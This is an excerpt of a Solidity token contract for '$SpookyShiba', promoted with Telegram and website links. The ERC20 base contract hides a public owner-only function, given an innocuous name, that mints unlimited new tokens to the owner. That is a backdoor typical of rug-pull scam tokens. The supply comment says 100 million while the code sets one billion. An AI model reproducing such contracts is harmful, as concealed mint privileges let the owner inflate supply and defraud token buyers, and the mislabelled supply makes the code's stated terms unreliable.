//
// $SpookyShibacn proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/SpookyShibacn
// 📱 Websiter::https://SpookyShiba.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SpookyShiba(uint256 amount) public onlyOwner {
 _SpookyShiba(msg.sender, amount);
    }
    ...
    function _SpookyShiba(address account, uint256 amount) internal virtual {
...
contract $SpookyShiba is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Spooky Shiba", "SPOOKY-SHIBA") {
     _SpookyShiba(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}